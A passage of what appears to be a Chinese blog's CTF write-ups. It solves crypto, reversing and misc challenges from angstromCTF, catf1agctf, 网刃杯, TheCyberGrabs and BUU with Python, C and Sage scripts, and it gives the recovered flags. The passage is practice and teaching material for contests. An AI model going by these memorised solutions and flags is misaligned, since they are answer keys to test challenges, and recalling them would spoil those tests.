&quot;}&quot; start = &quot;&quot;.join(random.choices(noise, k=random.randint(0, 2000))) end = &quot;&quot;.join(random.choices(noise, k=random.randint(0, 2000))) key = &quot;&quot;.join(random.choices(alpha, k=4)) print(f&quot;Challenge {i}: {start}{encrypt(fleg + 'fleg', key)}{end}&quot;) x = input(&quot;&gt; &quot;) if x != fleg: print(&quot;Nope! Better luck next time!&quot;) break i += 1 题目的意思是远端随机产生一个fleg，其被actf{}括起来，以及一个key，用key加密fleg+”fleg”字符串，并且将其仍到上千个字符中，并且服务端会在未输入的20秒之内关闭，在循环次数为50次的时候会将真正的flag放到noise字符串中。 代码参考 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import stringfrom pwn import *alphabet = string.ascii_lowercases = remote(&quot;challs.actf.co&quot;,31333)for count in range(51): s.recvuntil(&quot;Challenge&quot;) noise = str(s.recvuntil('\\n')) print(noise) output_file = open(&quot;output.txt&quot;,&quot;w&quot;) length = len(noise) print(length) for i in range(0, length - 50): # 如果连续四个字符是字母 if noise[i] in alphabet and noise[i + 1] in alphabet and noise[i + 2] in alphabet and noise[i + 3] in alphabet: if noise[i + 4] == '{': # 并且第五个是&quot;{&quot; a = noise[i:i + 6] # 开始往后循环，碰到&quot;{&quot;就停止， while noise[i + 5] != '}' and noise[i + 5] != '{' and noise[i + 5] != '\\n': i = i + 1 a = a + noise[i + 5] if noise[i + 5] == '{': continue # 碰到&quot;}&quot;并且后面的四个字符是字母，就放到文件中等待下一步读取 if noise[i + 6] in alphabet and noise[i + 7] in alphabet and noise[i + 8] in alphabet and noise[i + 9] in alphabet: a = a + (noise[i + 6:i + 10]) output_file.write(a+'\\n') else: continue else: continue output_file.close() #文件关闭 #打开文件待进一步的筛选 with open('output.txt') as fp: line = fp.readline() while line: noiseflag = line.strip() enc = line dec = 'actf' k = '' # 前四位加密前应为&quot;actf&quot;,由此逆出key alphabet = string.ascii_lowercase for i in range(0, 4): need_index = (alphabet.index(enc[i]) - alphabet.index(dec[i]) + 26) % 26 k = k + alphabet[need_index] msg = '' # 定义vinegar解密算法 def decrypt(ciph, key): ret = '' i = 0 for m in ciph: if m in alphabet: ret = ret + alphabet[(alphabet.index(m) - alphabet.index(key[i])) % len(alphabet)] i = (i + 1) % 4 else: ret = ret + m return ret # 如果后四位能被求出的key解密，结果位&quot;fleg&quot;,则表示筛选成功 if decrypt(noiseflag, k)[-4:] == 'fleg': dec_input = decrypt(noiseflag, k) # 未成功则再读取一行 line = fp.readline() # 输出解密出来的fleg字符串 print(count+1,end = &quot; : &quot;) print(str(dec_input.encode()[:-4])) # 向服务器发送解密后的fleg字符串，进入下一轮解密 s.sendline(dec_input.encode()[:-4]) 代码功能： 连接远端，提取noise字符串 粗略筛选匹配的字符串到文本文件中 在文本文件中，一行一行读取字符串，求出key，并且验证尾部的字符串是否是”fleg”，因为key一致 筛选完成后向服务端发送解密后的fleg 太强了，涉及到字符串的算法…… reverse","link":"/2022/05/08/CTF/2022angstromctf/"},{"title":"2022catf1agctf","text":"2022 catf1agctf 部分WriteUp Crypto怎么会多一个呢在线网站分解出来三个素数，和普通rsa解题一致 12345678910111213import gmpy2from Crypto.Util import numbern=73551482761993440116378276402850976017673970117685879384712768054097267028974244867004238587658366463106703581107613883463180833706377915593443986550610497954246664378469651e = 65537p = 2492374307q = 4254843227t = 6935768738605665705725288400892432256194550668863095515013942769049162888322407038880737120756913240675144540329112141837524407303580284917764285456453059d = gmpy2.invert(e,(p-1)*(q-1)*(t-1))c = 19088340804936031145050310701046663800140062626102387290922890724239533128878474005542684734507475562997222905703018409354867816494925059525377106444000231776165581716296665m = pow(c,d,n)print(number.long_to_bytes(m))# catf1ag{5a1dbe0e-c6bc-11ec-9ffe-e8d8d18b16eb} 高实在是高我看到题的时候发现e非常的小，就直接套低加密指数攻击那一套了 1234567891011121314from gmpy2 import irootfrom Crypto.Util import numbern=12665183429254325580945372911206360706257079006954643947743121664454914089524916634832685040737214233687785325112424576039016165508146660290974828802710996880849185068704144690143915135774197938764858051298755021664568772363301699454954045374224914126975984844824184263131757665633324767483926757913457691303836308728657455890530401047029807132954324528617558308552469993676230342998368641468028935159530808062712526662606628371783359397956992056631816818089093174030024770769185589578769480295675152580623898653766068001693142399972844934629828827684074705324777912603273764730083438485014417283937379823019721736119e=3c=757846665709612710047622798901607696475966191486157677993807167873384365513676489731461790205050172225086169489914035089956311182880536480621453222154862896612205436092262339764782754486059223792491004753337631375452744373859969281558865685434771438386779285599911963081936786091339632323042550461240292308997539607661877861high_m=911717829801678618100911351591485103708233783320853921932061644898078088242070960582223500287266227352502272k = 0while 1: res=iroot(c+k*n,e) if(res[1]==True): print(number.long_to_bytes(res[0])) break k=k+1# catf1ag{852a6546-9d42-4b42-bcd6-73c7f4327627} 赛后看z1r0大师傅wp才发现是rsa中的已知明文m题型，看来rsa题还是得刷(orz) 用sage在线环境可以解出来 123456789101112131415161718import binasciidef hexStr_to_str(hex_str): hex = hex_str.encode('utf-8') str_bin = binascii.unhexlify(hex) return str_bin.decode('utf-8')def phase2(high_m, n, c): R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation='NTL') m = high_m + x M = m((m^3 - c).small_roots()[0]) print(hexStr_to_str(hex(int(M))[2:]))n=12665183429254325580945372911206360706257079006954643947743121664454914089524916634832685040737214233687785325112424576039016165508146660290974828802710996880849185068704144690143915135774197938764858051298755021664568772363301699454954045374224914126975984844824184263131757665633324767483926757913457691303836308728657455890530401047029807132954324528617558308552469993676230342998368641468028935159530808062712526662606628371783359397956992056631816818089093174030024770769185589578769480295675152580623898653766068001693142399972844934629828827684074705324777912603273764730083438485014417283937379823019721736119e=3c=757846665709612710047622798901607696475966191486157677993807167873384365513676489731461790205050172225086169489914035089956311182880536480621453222154862896612205436092262339764782754486059223792491004753337631375452744373859969281558865685434771438386779285599911963081936786091339632323042550461240292308997539607661877861high_m=911717829801678618100911351591485103708233783320853921932061644898078088242070960582223500287266227352502272phase2(high_m, n, c)# catf1ag{852a6546-9d42-4b42-bcd6-73c7f4327627} 我这边就安装了一下sage环境，在github上下载完成后，双击安装包即可，可以多看看sage中文文档 sage的使用load()和attach()两种方法皆可，attach()会根据sage文件的修改加载，比较推荐 栓q通过这篇博客可以知道短信息的内容部分使用的是unicode编码 12345string = [0x771F ,0x7684 ,0x662F ,0x6813 ,0x0051 ,0x7ED9 ,0x4F60 ,0x0066 ,0x006C ,0x0061,0x0067,0xFF1A,0x0063,0x0061,0x0074,0x0066,0x0031,0x0061,0x0067,0x007B,\\0x0066,0x0034,0x0065,0x0066,0x0037,0x0064,0x0064,0x0036,0x002D,0x0063,0x0064,0x0061,0x0031,0x002D,0x0031,0x0031]for i in string: print(chr(i),end = &quot;&quot;)# 真的是栓Q给你flag：catf1ag{f4ef7dd6-cda1-11 但是只发现了一半的flag 原来是零宽度字符隐写……放上大佬总结的文章 在线网站：http://330k.github.io/misc_tools/unicode_steganography.html 1# catf1ag{f4ef7dd6-cda1-11ec-860b-2cf05d95545} 怕是我少见多怪了（orz）","link":"/2022/05/10/CTF/2022catf1agctf/"},{"title":"2022第二届网刃杯网络安全大赛","text":"过来学习一下~ Re_funtion压缩包有密码，可以看到右边有16进制数字，通过开头可以确定是png格式的文件 放到010editor中，改一下后缀，即可看到解码密码： 解压后，给出了的两个文件，先从re_easy_func1.exe中获取base64魔改后的加密字符串 123456789101112131415161718#include &lt;stdio.h&gt;int main(int argv,char** argc){ int s[28] = {0x64, 0x71, 0x54, 0x54, 0x64, 0x78, 0x74, 0x78, 0x64, 0x41, 0x40, 0x48, 0x70, 0x6D, 0x18, 0x4A, 0x41, 0x78, 0x66, 0x72, 0x41, 0x78, 0x5E, 0x4E, 0x5D, 0x52, 0x0E, 0x3D}; int f[28] = {0}; for (int i = 0;i&lt;28;i++){ if(i%2 == 0){ f[i] = s[i]^0x37; } else{ f[i] = s[i]; } } for (int i = 0;i&lt;28;i++){ printf(&quot;%c&quot;,f[i]); } getchar(); return 0;} 12345import base64flag = &quot;SqcTSxCxSAwHGm/JvxQrvxiNjR9=&quot;string1 = &quot;FeVYKw6a0lDIOsnZQ5EAf2MvjS1GUiLWPTtH4JqRgu3dbC8hrcNo9/mxzpXBky7+&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print (base64.b64decode(flag.translate(str.maketrans(string1,string2)))) 当然也可用神器cyberchef ez_algorithm用ida分析，可以得出下面的流程： 下面的encryption3函数的流程： 思路：先对字符串encryption3函数的逆向，下面是encryption3的运算: 把encryption3从ida里面复制出来，用c跑一下可以找到一下的对应关系： 123&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; &quot;9876543210uvwxyztnopqrshijklmgabcdefUVWXYZTNOPQRSHIJKLMGABCDEF&quot; 那么： 12# &quot;BRUF{E6oU9Ci#J9+6nWAhwMR9n:}&quot;# &quot;VLAZ{Y3iA0Wo#P0+3hCUncSL0h:}&quot; 当然也可以用代码： 123456789101112131415161718192021string = &quot;BRUF{E6oU9Ci#J9+6nWAhwMR9n:}&quot;s = &quot;&quot;for i in string: if i in &quot;uvwxyz&quot; or i in &quot;UVWXYZ&quot;: s+=chr(ord(i) - 20) elif i in &quot;abcdef&quot; or i in &quot;ABCDEF&quot;: s+=chr(ord(i) + 20) elif i in &quot;hijklm&quot; or i in &quot;HIJKLM&quot;: s+=chr(ord(i) + 6) elif i in &quot;nopqrs&quot; or i in &quot;NOPQRS&quot;: s+=chr(ord(i) - 6) elif i == &quot;g&quot; or i == &quot;G&quot;: s += chr(ord(i) + 13) elif i == &quot;t&quot; or i == &quot;T&quot;: s += chr(ord(i) - 13) elif i in &quot;0123456789&quot;: s += chr(105-ord(i)) else: s += iprint(s)# &quot;VLAZ{Y3iA0Wo#P0+3hCUncSL0h:}&quot; 再对字符串进行大小写转换 最后再根据i对4的求余值，进行逆运算 12345678910111213141516171819202122232425262728293031323334353637383940414243s = &quot;VLAZ{Y3iA0Wo_P0_3hCUncSL0h:}&quot;.swapcase()string1 = &quot;ckagevdxizblqnwtmsrpufyhoj&quot;string2 = &quot;TMQZWKGOIAGLBYHPCRJSUXEVND&quot;# encryption3逆运算 flag = &quot;&quot;for i in range(len(s)): if ord(s[i]) &gt;= 97 and ord(s[i]) &lt;= 122: index = string1.index(s[i]) t = i % 4 if t == 0: result = index + t flag += chr(result + 65) elif t == 1: result = index // t flag += chr(result + 65) elif t == 2: result = index ^ t flag += chr(result + 65) else : result = index - t flag += chr(result + 65) elif ord(s[i]) &gt;= 65 and ord(s[i]) &lt;= 90: index = string2.index(s[i]) t = i % 4 if t == 0: result = index + t flag += chr(result + 65) elif t == 1: result = index - t flag += chr(result + 65) elif t == 2: result = index // t flag += chr(result + 65) else: result = index ^ t flag += chr(result + 97) else: flag += s[i]print(flag)# FLAG{W3lC0Me_T0_3NCRYPTI0N:} 然后放入ida中动调，稍微改改，对比一下，结果就出来了。 freestyle解一下数学题，两个挑战，3277，105，MD5","link":"/2022/04/25/CTF/2022%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"},{"title":"TheCyberGrabs","text":"复现一下2022 TheCyberGrabs ReverseNo Strings直接用ida64打开 跟进main函数 看到这边就是flag，放在python里面试了一下，就是flag了 123lis = ['4','l','W','A','Y','5','_','s','T','r','I','n','G','$','_','D','O','E','s','_','N','o','7','_','W','O','R','K']for i in lis: print(i,end = '') cybergrabs{4lWAY5_sTrInG$_DOEs_No7_WORK} Custom Cipher题目给我们一个pyc文件，我在网页上反汇编pyc文件，得到了下面的代码： 12345678910111213141516171819encoded_flag = '*@),9.9():B@tz&amp;k6&lt;5i&amp;\\\\mX&amp;xmn-y&amp;*Vu/,wD'alphabet = '!&quot;#$%&amp;\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\\[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'def encode_secret(secret): rotate_const = 37 encoded = '' for c in secret: index = alphabet.find(c) original_index = (index + rotate_const) % len(alphabet) encoded = encoded + alphabet[original_index] return encodedtext = input('Enter any text to encrypt: ')if encoded_flag == encode_secret(text): print('Congratulations!!!. You found the flag.')else: print('Sorry!!!') 这边遇到了我最怕的index转换了，其实仔细想想还是挺容易的，我们从后往前做，如果“对表”，我们就“寻表”，如果加法，我们就减法 对表：a=string[i] 寻表：i = string.find(a) 还有一个就是关于%的：（a+b）%c = a%c+b%c 下面是exp: 1234567891011121314encoded_flag = '*@),9.9():B@tz&amp;k6&lt;5i&amp;\\\\mX&amp;xmn-y&amp;*Vu/,wD'alphabet = '!&quot;#$%&amp;\\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ\\[\\\\]^_`abcdefghijklmnopqrstuvwxyz{|}~'print(len(alphabet))flag = ''for i in encoded_flag: original_index = alphabet.find(i) index = original_index%94 - 37 str1 = alphabet[index] flag += str1print(flag) cybergrabs{yOU_FounD_7H3_SHIfT_c1PheR} Simple直接用ida64打开，我们跟进sub_1188这个函数 a2是我们输入的字符flag，*( *(a2 + 8) +i ) )就可以看成flag[i] 下面是exp: 123string = &quot;QllB^pvCloQebCfopqCi^d&quot;for i in range(len(string)): print(chr(ord(string[i])+3),end = '') cybergrabs{TooEasyForTheFirstFlag} ahh shit! 看到这边就直接把h3r3_w3_g0_4g4in!带入试试。 cybergrabs{h3r3_w3_g0_4g4in!} 除了reverse，misc也有好玩的题目： MISCFirst Telecommunication 5位的二进制解码，和z1r0想了半天，才晓得是博多密码…… 参考文档：https://www.cnblogs.com/junlebao/p/14025048.html 博多码解码网站：https://www.boxentriq.com/code-breaking/baudot-code 转换成小写，就是flag了，flag里面也提示了，是baubot(博多)密码 cybergrabs{yougotthisbaubot} Discord 这个要笑死了，打开这个之后，瞪大双眼，flag就在其中 cybergrabs{1_am_h3r3} Electronics 这个是真没解出来…… 还有一个feedback…… 真的要笑死了……","link":"/2022/02/07/CTF/TheCyberGrabs_reverse/"},{"title":"BUU_reverse","text":"记录BUU上刷的Reverse题 [羊城杯 2020]Bytecode (py字节码)题目中给出了挺长的字节码，在解这道题的时候，需要多参考查看官方dis反汇编器的文档。 可以使用以下命令，时不时反汇编一下逆向出的代码，进行对比。 1python3 -m dis fileName.py 题目给出的字节码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384 4 0 LOAD_CONST 0 (3) # LOAD_CONST 压栈操作 3 LOAD_CONST 1 (37) 6 LOAD_CONST 2 (72) 9 LOAD_CONST 3 (9) 12 LOAD_CONST 4 (6) 15 LOAD_CONST 5 (132) 18 BUILD_LIST 6 # 创建列表 21 STORE_NAME 0 (en) # en = [3,37,72,9,6,132] 5 24 LOAD_CONST 6 (101) 27 LOAD_CONST 7 (96) 30 LOAD_CONST 8 (23) 33 LOAD_CONST 9 (68) 36 LOAD_CONST 10 (112) 39 LOAD_CONST 11 (42) 42 LOAD_CONST 12 (107) 45 LOAD_CONST 13 (62) 48 LOAD_CONST 7 (96) 51 LOAD_CONST 14 (53) 54 LOAD_CONST 15 (176) 57 LOAD_CONST 16 (179) 60 LOAD_CONST 17 (98) 63 LOAD_CONST 14 (53) 66 LOAD_CONST 18 (67) 69 LOAD_CONST 19 (29) 72 LOAD_CONST 20 (41) 75 LOAD_CONST 21 (120) 78 LOAD_CONST 22 (60) 81 LOAD_CONST 23 (106) 84 LOAD_CONST 24 (51) 87 LOAD_CONST 6 (101) 90 LOAD_CONST 25 (178) 93 LOAD_CONST 26 (189) 96 LOAD_CONST 6 (101) 99 LOAD_CONST 27 (48) 102 BUILD_LIST 26 # 创建列表 105 STORE_NAME 1 (output) # output = [101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48] 7 108 LOAD_CONST 28 ('welcome to GWHT2020') 111 PRINT_ITEM 112 PRINT_NEWLINE 9 113 LOAD_NAME 2 (raw_input) 116 LOAD_CONST 29 ('please input your flag:') 119 CALL_FUNCTION 1 122 STORE_NAME 3 (flag)10 125 LOAD_NAME 3 (flag) 128 STORE_NAME 4 (str)12 131 LOAD_NAME 5 (len) 134 LOAD_NAME 4 (str) 137 CALL_FUNCTION 1 140 STORE_NAME 6 (a)13 143 LOAD_NAME 6 (a) 146 LOAD_CONST 30 (38) 149 COMPARE_OP 0 (&lt;) 152 POP_JUMP_IF_FALSE 17314 155 LOAD_CONST 31 ('lenth wrong!') 158 PRINT_ITEM 159 PRINT_NEWLINE 15 160 LOAD_NAME 7 (exit) # if len(str) &lt; 38: 163 LOAD_CONST 32 (0) # sys.exit(0) 166 CALL_FUNCTION 1 # else: 169 POP_TOP 170 JUMP_FORWARD 0 (to 173)17 &gt;&gt; 173 LOAD_NAME 8 (ord) 176 LOAD_NAME 4 (str) 179 LOAD_CONST 32 (0) 182 BINARY_SUBSCR 183 CALL_FUNCTION 1 186 LOAD_CONST 33 (2020) 189 BINARY_MULTIPLY # ord(str[0])*2020 190 LOAD_NAME 8 (ord) 193 LOAD_NAME 4 (str) # ord(str[1]) 196 LOAD_CONST 34 (1) 199 BINARY_SUBSCR 200 CALL_FUNCTION 1 203 BINARY_ADD # ord(str[0])*2020 + ord(str[1]) 204 LOAD_CONST 33 (2020) # (ord(str[0])*2020 + ord(str[1]))*2020 207 BINARY_MULTIPLY 208 LOAD_NAME 8 (ord) 211 LOAD_NAME 4 (str) 214 LOAD_CONST 35 (2) 217 BINARY_SUBSCR 218 CALL_FUNCTION 1 221 BINARY_ADD # (ord(str[0])*2020 + ord(str[1]))*2020 + ord(str[2]) 222 LOAD_CONST 33 (2020) 225 BINARY_MULTIPLY # ((ord(str[0])*2020 + ord(str[1]))*2020 + ord(str[2]))*2020 226 LOAD_NAME 8 (ord) ord(str[3]) 229 LOAD_NAME 4 (str) 232 LOAD_CONST 0 (3) 235 BINARY_SUBSCR 236 CALL_FUNCTION 1 239 BINARY_ADD # ((ord(str[0])*2020 + ord(str[1]))*2020 + ord(str[2]))*2020 + ord(str[3]) 240 LOAD_CONST 33 (2020) 243 BINARY_MULTIPLY 244 LOAD_NAME 8 (ord) 247 LOAD_NAME 4 (str) 250 LOAD_CONST 36 (4) 253 BINARY_SUBSCR 254 CALL_FUNCTION 1 # ord(str[4]) 257 BINARY_ADD # (((ord(str[0])*2020 + ord(str[1]))*2020 + ord(str[2])*2020) + ord(str[3]))*2020 + ord(str[4]) 258 LOAD_CONST 37 (1182843538814603) 261 COMPARE_OP 2 (==) # (((ord(str[0])*2020 + ord(str[1]))*2020 + ord(str[2])*2020) + ord(str[3]))*2020 + ord(str[4]) == 1182843538814603 264 POP_JUMP_IF_FALSE 275 18 267 LOAD_CONST 38 ('good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6') 270 PRINT_ITEM 271 PRINT_NEWLINE 272 JUMP_FORWARD 15 (to 290)20 &gt;&gt; 275 LOAD_CONST 39 ('bye~') 278 PRINT_ITEM 279 PRINT_NEWLINE 21 280 LOAD_NAME 7 (exit) 283 LOAD_CONST 32 (0) 286 CALL_FUNCTION 1 289 POP_TOP 23 &gt;&gt; 290 BUILD_LIST 0 293 STORE_NAME 9 (x) # x = []24 296 LOAD_CONST 40 (5) 299 STORE_NAME 10 (k) # k = 525 302 SETUP_LOOP 128 (to 433) # for i in range(13): 305 LOAD_NAME 11 (range) 308 LOAD_CONST 41 (13) 311 CALL_FUNCTION 1 314 GET_ITER &gt;&gt; 315 FOR_ITER 114 (to 432) 318 STORE_NAME 12 (i)26 321 LOAD_NAME 8 (ord) 324 LOAD_NAME 4 (str) 327 LOAD_NAME 10 (k) # b = ord(str[k]) 330 BINARY_SUBSCR 331 CALL_FUNCTION 1 334 STORE_NAME 13 (b)27 337 LOAD_NAME 8 (ord) 340 LOAD_NAME 4 (str) 343 LOAD_NAME 10 (k) 346 LOAD_CONST 34 (1) 349 BINARY_ADD 350 BINARY_SUBSCR 351 CALL_FUNCTION 1 354 STORE_NAME 14 (c) # c = ord(str[k+1])28 357 LOAD_NAME 14 (c) 360 LOAD_NAME 0 (en) 363 LOAD_NAME 12 (i) 366 LOAD_CONST 4 (6) 369 BINARY_MODULO # % 370 BINARY_SUBSCR 371 BINARY_XOR 372 STORE_NAME 15 (a11) # a11 = c ^ en[(i % 6)]29 375 LOAD_NAME 13 (b) 378 LOAD_NAME 0 (en) 381 LOAD_NAME 12 (i) 384 LOAD_CONST 4 (6) 387 BINARY_MODULO 388 BINARY_SUBSCR 389 BINARY_XOR 390 STORE_NAME 16 (a22) # a22 = b ^ en[(i % 6)]30 393 LOAD_NAME 9 (x) 396 LOAD_ATTR 17 (append) 399 LOAD_NAME 15 (a11) 402 CALL_FUNCTION 1 # x.append(a11) 405 POP_TOP 31 406 LOAD_NAME 9 (x) 409 LOAD_ATTR 17 (append) 412 LOAD_NAME 16 (a22) # x.append(a22) 415 CALL_FUNCTION 1 418 POP_TOP 32 419 LOAD_NAME 10 (k) # k = k + 2 422 LOAD_CONST 35 (2) 425 INPLACE_ADD 426 STORE_NAME 10 (k) 429 JUMP_ABSOLUTE 315 &gt;&gt; 432 POP_BLOCK 33 &gt;&gt; 433 LOAD_NAME 9 (x) 436 LOAD_NAME 1 (output) # if x != output: 439 COMPARE_OP 2 (==) 442 POP_JUMP_IF_FALSE 45334 445 LOAD_CONST 38 ('good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6') 448 PRINT_ITEM 449 PRINT_NEWLINE 450 JUMP_FORWARD 15 (to 468)36 &gt;&gt; 453 LOAD_CONST 42 ('oh,you are wrong!') 456 PRINT_ITEM 457 PRINT_NEWLINE 37 458 LOAD_NAME 7 (exit) 461 LOAD_CONST 32 (0) 464 CALL_FUNCTION 1 467 POP_TOP 39 &gt;&gt; 468 LOAD_NAME 5 (len) 471 LOAD_NAME 4 (str) 474 CALL_FUNCTION 1 477 STORE_NAME 18 (l) # l = len(str)40 480 LOAD_NAME 8 (ord) 483 LOAD_NAME 4 (str) 486 LOAD_NAME 18 (l) 489 LOAD_CONST 43 (7) 492 BINARY_SUBTRACT 493 BINARY_SUBSCR 494 CALL_FUNCTION 1 497 STORE_NAME 19 (a1) # a1 = ord(str[l-7])41 500 LOAD_NAME 8 (ord) 503 LOAD_NAME 4 (str) 506 LOAD_NAME 18 (l) 509 LOAD_CONST 4 (6) 512 BINARY_SUBTRACT 513 BINARY_SUBSCR 514 CALL_FUNCTION 1 517 STORE_NAME 20 (a2) # a2 = ord(str[l-6])42 520 LOAD_NAME 8 (ord) 523 LOAD_NAME 4 (str) 526 LOAD_NAME 18 (l) 529 LOAD_CONST 40 (5) 532 BINARY_SUBTRACT 533 BINARY_SUBSCR 534 CALL_FUNCTION 1 537 STORE_NAME 21 (a3) # a3 = ord(str[l-5])43 540 LOAD_NAME 8 (ord) 543 LOAD_NAME 4 (str) 546 LOAD_NAME 18 (l) 549 LOAD_CONST 36 (4) 552 BINARY_SUBTRACT 553 BINARY_SUBSCR 554 CALL_FUNCTION 1 557 STORE_NAME 22 (a4) # a4 = ord(str[l-4])44 560 LOAD_NAME 8 (ord) 563 LOAD_NAME 4 (str) 566 LOAD_NAME 18 (l) 569 LOAD_CONST 0 (3) 572 BINARY_SUBTRACT 573 BINARY_SUBSCR 574 CALL_FUNCTION 1 577 STORE_NAME 23 (a5) # a5 = ord(str[l-3])45 580 LOAD_NAME 8 (ord) 583 LOAD_NAME 4 (str) 586 LOAD_NAME 18 (l) 589 LOAD_CONST 35 (2) 592 BINARY_SUBTRACT 593 BINARY_SUBSCR 594 CALL_FUNCTION 1 597 STORE_NAME 24 (a6) # a6 = ord(str[l-2])46 600 LOAD_NAME 19 (a1) 603 LOAD_CONST 0 (3) 606 BINARY_MULTIPLY 607 LOAD_NAME 20 (a2) 610 LOAD_CONST 35 (2) 613 BINARY_MULTIPLY 614 BINARY_ADD 615 LOAD_NAME 21 (a3) 618 LOAD_CONST 40 (5) 621 BINARY_MULTIPLY 622 BINARY_ADD 623 LOAD_CONST 44 (1003) 626 COMPARE_OP 2 (==) 629 POP_JUMP_IF_FALSE 807 # if a1*3+a2*2+a3*5 == 1003:47 632 LOAD_NAME 19 (a1) 635 LOAD_CONST 36 (4) 638 BINARY_MULTIPLY 639 LOAD_NAME 20 (a2) 642 LOAD_CONST 43 (7) 645 BINARY_MULTIPLY 646 BINARY_ADD 647 LOAD_NAME 21 (a3) 650 LOAD_CONST 3 (9) 653 BINARY_MULTIPLY 654 BINARY_ADD 655 LOAD_CONST 45 (2013) 658 COMPARE_OP 2 (==) 661 POP_JUMP_IF_FALSE 807 # if a1*4 + a2*7 + a3*9 == 2013:48 664 LOAD_NAME 19 (a1) 667 LOAD_NAME 20 (a2) 670 LOAD_CONST 46 (8) 673 BINARY_MULTIPLY 674 BINARY_ADD 675 LOAD_NAME 21 (a3) 678 LOAD_CONST 35 (2) 681 BINARY_MULTIPLY 682 BINARY_ADD 683 LOAD_CONST 47 (1109) 686 COMPARE_OP 2 (==) 689 POP_JUMP_IF_FALSE 804 # if a1 + a2*8 +a3*2 == 110949 692 LOAD_NAME 22 (a4) 695 LOAD_CONST 0 (3) 698 BINARY_MULTIPLY 699 LOAD_NAME 23 (a5) 702 LOAD_CONST 35 (2) 705 BINARY_MULTIPLY 706 BINARY_ADD 707 LOAD_NAME 24 (a6) 710 LOAD_CONST 40 (5) 713 BINARY_MULTIPLY 714 BINARY_ADD 715 LOAD_CONST 48 (671) 718 COMPARE_OP 2 (==) 721 POP_JUMP_IF_FALSE 801 # if a4*3+a5*2+a6*5 == 671:50 724 LOAD_NAME 22 (a4) 727 LOAD_CONST 36 (4) 730 BINARY_MULTIPLY 731 LOAD_NAME 23 (a5) 734 LOAD_CONST 43 (7) 737 BINARY_MULTIPLY 738 BINARY_ADD 739 LOAD_NAME 24 (a6) 742 LOAD_CONST 3 (9) 745 BINARY_MULTIPLY 746 BINARY_ADD 747 LOAD_CONST 49 (1252) 750 COMPARE_OP 2 (==) 753 POP_JUMP_IF_FALSE 798 # if a4*4+a5*7+a6*9 == 125251 756 LOAD_NAME 22 (a4) 759 LOAD_NAME 23 (a5) 762 LOAD_CONST 46 (8) 765 BINARY_MULTIPLY 766 BINARY_ADD 767 LOAD_NAME 24 (a6) 770 LOAD_CONST 35 (2) 773 BINARY_MULTIPLY 774 BINARY_ADD 775 LOAD_CONST 50 (644) 778 COMPARE_OP 2 (==) 781 POP_JUMP_IF_FALSE 795 # if a4 + a5*8 + a6*2 == 64452 784 LOAD_CONST 51 ('congraduation!you get the right flag!') 787 PRINT_ITEM 788 PRINT_NEWLINE 789 JUMP_ABSOLUTE 795 792 JUMP_ABSOLUTE 798 &gt;&gt; 795 JUMP_ABSOLUTE 801 &gt;&gt; 798 JUMP_ABSOLUTE 804 &gt;&gt; 801 JUMP_ABSOLUTE 807 &gt;&gt; 804 JUMP_FORWARD 0 (to 807) &gt;&gt; 807 LOAD_CONST 52 (None) 810 RETURN_VALUE 本人逆向出来的，或许有些许出入，但逻辑基本正确…… 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import sysen = [3,37,72,9,6,132]print('welcome to GWHT2020')flag = input('please input your flag:')str = flaga = len(str(a))if a &lt; 38: print('lenth wrong!') sys.exit()if (((ord(str[0])*2020 + ord(str[1]))*2020 + ord(str[2])*2020) + ord(str[3]))*2020 + ord(str[4]) == 1182843538814603: print(&quot;good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6&quot;)else: sys.exit()output = [101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]x = []k = 5for i in range(13): a11 = ord(str[k]) ^ en[(i % 6)] a22 = ord(str[k+1])^ en[(i % 6)] x.append(a11) x.append(a22) k = k + 2if x == output: print('good!continue\\xe2\\x80\\xa6\\xe2\\x80\\xa6')else: sys.exit()l = len(str)a1 = ord(str[l-7])a2 = ord(str[l-6])a3 = ord(str[l-5])a4 = ord(str[l-4])a5 = ord(str[l-3])a6 = ord(str[l-2])if a1*3+a2*2+a3*5 == 1003: if a1*4 + a2*7 + a3*9 == 2013: if a1 + a2*8 +a3*2 == 1109: if a4*3+a5*2+a6*5 == 671: if a4*4+a5*7+a6*9 == 1252: if a4 + a5*8 + a6*2 == 644: print('congraduation!you get the right flag!') 首先是开头的五个字符的爆破代码： 1234567891011import stringarr = []for i in string.printable: arr.append(ord(i))for str_0 in arr: for str_1 in arr: for str_2 in arr: for str_3 in arr: if ((((str_0*2020 + str_1)*2020 + str_2)*2020) + str_3)*2020 + ord(&quot;{&quot;) == 1182843538814603: print(chr(str_0),chr(str_1),chr(str_2),chr(str_3),&quot;{&quot;) # G W H T { 然后是中间的异或运算，我还是使用的爆破： 1234567891011121314151617import stringoutput = [101,96,23,68,112,42,107,62,96,53,176,179,98,53,67,29,41,120,60,106,51,101,178,189,101,48]en = 